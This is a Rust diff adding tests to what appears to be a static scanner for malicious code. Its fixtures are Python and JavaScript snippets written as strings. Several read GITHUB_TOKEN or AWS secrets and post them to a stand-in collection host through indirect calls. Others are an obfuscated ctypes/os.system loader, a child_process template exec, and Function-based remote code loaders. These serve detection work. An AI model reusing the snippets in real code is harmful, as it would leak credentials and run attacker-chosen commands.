@@ -3678,6 +3678,7 @@ mod reconcile {
                 "DESER-CHAIN-001",
                 "DROPPER-CHAIN-001",
                 "EXFIL-CHAIN-001",
+                "INFER-CHAIN-001",
                 "TLS-CHAIN-001",
             ],
             "a chain was added or removed: decide its name_uses and update this list"
@@ -4110,6 +4111,201 @@ mod reconcile {
         assert_eq!(
             chained("db.py", &after, "EXFIL-CHAIN-001"),
             Some(Severity::Critical)
+        );
+    }
+
+    /// Hunt finding H4: a send helper whose parameter shadows the secret's
+    /// name is invoked *by reference* — stored in a list, a dict or an array,
+    /// aliased, or passed as a callback — and the indirect call site
+    /// (`handlers[0](token)`, `for h in handlers: h(token)`) is not one the
+    /// engine recognises as calling the helper. The shadowing check must fail
+    /// open when the helper's bare name is used as a value at or below the
+    /// source, so the chain is kept.
+    #[test]
+    fn exfil_chain_keeps_a_helper_used_by_reference() {
+        let py_list = "import os, requests\n\
+            token = os.environ[\"GITHUB_TOKEN\"]\n\
+            def upload(token):\n\
+            \x20   requests.post(\"https://example.com/collect\", data=token)\n\
+            handlers = [upload]\n\
+            handlers[0](token)\n";
+        let py_dict = "import os, requests\n\
+            token = os.environ[\"AWS_SECRET_ACCESS_KEY\"]\n\
+            def upload(token):\n\
+            \x20   requests.post(\"https://example.com/collect\", data=token)\n\
+            routes = {\"go\": upload}\n\
+            routes[\"go\"](token)\n";
+        let py_loop = "import os, requests\n\
+            token = os.environ[\"GITHUB_TOKEN\"]\n\
+            def upload(token):\n\
+            \x20   requests.post(\"https://example.com/collect\", data=token)\n\
+            handlers = []\n\
+            handlers.append(upload)\n\
+            for h in handlers:\n\
+            \x20   h(token)\n";
+        let py_alias = "import os, requests\n\
+            token = os.environ[\"GITHUB_TOKEN\"]\n\
+            def upload(token):\n\
+            \x20   requests.post(\"https://example.com/collect\", data=token)\n\
+            send = upload\n\
+            send(token)\n";
+        let py_decorator = "import os, requests\n\
+            HANDLERS = []\n\
+            token = os.environ[\"GITHUB_TOKEN\"]\n\
+            def register(f):\n\
+            \x20   HANDLERS.append(f)\n\
+            \x20   return f\n\
+            @register\n\
+            def upload(token):\n\
+            \x20   requests.post(\"https://example.com/collect\", data=token)\n\
+            for h in HANDLERS:\n\
+            \x20   h(token)\n";
+        let js_array = "const token = process.env.GITHUB_TOKEN;\n\
+            function upload(token) {\n\
+            \x20 fetch(\"https://example.com/collect\", { body: token });\n\
+            }\n\
+            const handlers = [upload];\n\
+            handlers[0](token);\n";
+        for (name, src) in [
+            ("py list dispatch", py_list),
+            ("py dict dispatch", py_dict),
+            ("py append+loop", py_loop),
+            ("py alias", py_alias),
+            ("py decorator registry", py_decorator),
+        ] {
+            assert_eq!(
+                chained("collect.py", src, "EXFIL-CHAIN-001"),
+                Some(Severity::Critical),
+                "{name}"
+            );
+        }
+        assert_eq!(
+            chained("collect.js", js_array, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical),
+            "js array dispatch"
+        );
+        // The false-positive control still holds: a helper whose parameter
+        // shadows the name and that is never used as a value (only defined and
+        // perhaps called with a non-secret) stays suppressed.
+        let benign = "import os, requests\n\
+            token = os.environ[\"DATABASE_URL\"]\n\
+            engine = create_engine(token)\n\
+            def ping(token):\n\
+            \x20   return requests.get(token + \"/ping\", timeout=3)\n\
+            ping(\"https://status.example.com\")\n";
+        assert_eq!(
+            chained("db.py", benign, "EXFIL-CHAIN-001"),
+            None,
+            "benign shadow"
+        );
+    }
+
+    /// Hunt finding H2: an obfuscated one-line ctypes loader keeps its
+    /// tokens more than 300 bytes apart, so the bounded span missed it. The
+    /// `ctypes … CDLL … os.system` alternative is unbounded again (the engine
+    /// matches per line, so it cannot run away across a file, and no clean
+    /// sample matched this alternative).
+    #[test]
+    fn supply016_matches_a_one_line_ctypes_loader() {
+        let recon = "host = socket.gethostname(); machine = platform.machine(); \
+            osname = platform.system(); node = platform.node(); rel = platform.release(); \
+            ver = platform.version(); proc = platform.processor(); \
+            info = json.dumps({\"host\": host, \"machine\": machine, \"os\": osname}); \
+            target = os.environ.get(\"SETUP_CMD\", \"uname -a\"); ";
+        let line = format!("    lib = ctypes.CDLL(\"libc.so.6\"); {recon}os.system(target)");
+        assert!(
+            line.find("os.system").unwrap() - (line.find("CDLL").unwrap() + 4) > 300,
+            "probe must exceed the old 300-byte bound"
+        );
+        let src = format!("import ctypes, os, platform, socket, json\n{line}\n");
+        assert!(
+            fires("__init__.py", &src, "SUPPLY-016"),
+            "one-line ctypes loader"
+        );
+    }
+
+    /// Hunt finding H3: a minified bundle that renders a template and runs it
+    /// through `child_process` keeps `template(...)` and `exec` more than 200
+    /// bytes apart on one line. The alternative is now unbounded but gated on
+    /// `child_process`, which the benign template+regex.exec bundles (chalk,
+    /// lodash render helpers) do not carry.
+    #[test]
+    fn supply008_matches_a_minified_child_process_template_exec() {
+        let malicious = "const cp=require(\"child_process\");const _=require(\"lodash\");\
+            function run(t,d){const render=_.template(t);const out=render(d);\
+            const parts=out.split(\"\\n\").map(s=>s.trim()).filter(Boolean);\
+            const meta={n:parts.length,first:parts[0]||\"\",last:parts[parts.length-1]||\"\",\
+            joined:parts.join(\";\")};const key=Object.keys(d).sort().join(\",\");\
+            const stamp=Date.now();cp.exec(meta.joined);}module.exports={run};";
+        assert!(
+            fires("index.js", malicious, "SUPPLY-008"),
+            "cp.exec template"
+        );
+        // execSync too, and child_process after the exec call (webpack layout).
+        let sync = "const n=require(\"child_process\"),o=require(\"lodash\");\
+            function t(e,t){const s=o.template(e)(t);n.execSync(s)}";
+        assert!(fires("index.js", sync, "SUPPLY-008"), "execSync template");
+        // The benign shape the bound protected: a template call and a regex
+        // `.exec` far apart, with no child_process, does not fire.
+        let benign = "return template(chalk, parts.join(''));".to_string()
+            + &" ".repeat(220)
+            + "while ((matches = STYLE_REGEX.exec(style)) !== null) {}";
+        assert!(
+            !fires("index.js", &benign, "SUPPLY-008"),
+            "template + regex.exec without child_process must stay quiet"
+        );
+    }
+
+    /// Hunt finding H5: a Function built with Node capabilities and invoked on
+    /// the same expression with the real `require`/`process` is an in-memory
+    /// loader (CODE-017, High). A plain `new Function` returned from a helper
+    /// (a polyfill's arity wrapper) is not.
+    #[test]
+    fn code017_flags_a_require_capable_immediately_invoked_function() {
+        for line in [
+            "load('https://cdn.example.com/a.js', src => new Function('require', src)(require));",
+            "new Function('require', 'process', src)(require, process);",
+            "const f = Function('module','exports','require', code)(module, exports, require);",
+        ] {
+            assert!(
+                fires("index.js", line, "CODE-017"),
+                "CODE-017 must fire: {line}"
+            );
+        }
+        for line in [
+            "const collect = pageFunction([ew(0x725)], ew(0x12cd));",
+            "return new Function('a', 'b', 'return a+b');",
+            "const g = new Function('data', 'return data.x')(input);",
+        ] {
+            assert!(
+                !fires("index.js", line, "CODE-017"),
+                "CODE-017 must not fire: {line}"
+            );
+        }
+    }
+
+    /// Hunt disputed INFER-007: a hardcoded LLM client key and a non-vendor
+    /// baseURL in the same multi-line client config (which evades the
+    /// same-line INFER-001) link into INFER-CHAIN-001 Critical. A vendor
+    /// baseURL, or a key with no off-vendor endpoint, does not.
+    #[test]
+    fn infer_chain_links_a_hardcoded_key_to_a_nonvendor_endpoint() {
+        let relay = "import OpenAI from \"openai\";\n\
+            const client = new OpenAI({\n\
+            \x20 apiKey: \"rly_7Hq2Lx9Vn4Tb8Wc3Zk6Pm1Rd5Sg0Fa\",\n\
+            \x20 baseURL: \"https://relay.example.test/v1\",\n\
+            });\n";
+        assert_eq!(
+            chained("llm.js", relay, "INFER-CHAIN-001"),
+            Some(Severity::Critical),
+            "key + off-vendor endpoint"
+        );
+        // A vendor endpoint (INFER-012 suppressed) does not chain.
+        let vendor = relay.replace("relay.example.test/v1", "api.openai.com/v1");
+        assert_eq!(
+            chained("llm.js", &vendor, "INFER-CHAIN-001"),
+            None,
+            "vendor endpoint must not chain"
         );
     }
 
